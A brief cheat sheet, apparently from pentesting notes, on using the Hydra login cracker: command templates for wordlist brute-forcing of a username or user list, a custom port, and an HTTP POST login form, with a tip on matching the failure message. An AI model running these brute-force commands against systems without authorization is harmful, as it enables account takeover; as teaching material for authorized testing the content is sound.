# Hydra

Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.

*basic syntax*
```
hydra -l username -P /path/to/wordlist TargetIP [-t 4] protocol
```

*cracking User & Password*
```
hydra -l path/to/userlist -P /path/to/wordlist TargetIP [-t 4] protocol
```

*specify different port*
```
hydra -s PORT -l <username> -P </path/to/wordlist> TargetIP [-t 4] protocol
```

*bruteforce a POST login form*
```
hydra -l <username> -P <wordlist> TargetIP http-post-form "/:username=^USER^&password=^PASS^:<"+"=incorrect">
```

+ we need to insert something that let hydra know that the login was unsuccessful such as "username or password are incorrect". We find this statement by simply insert incorrect parameter and look at the response
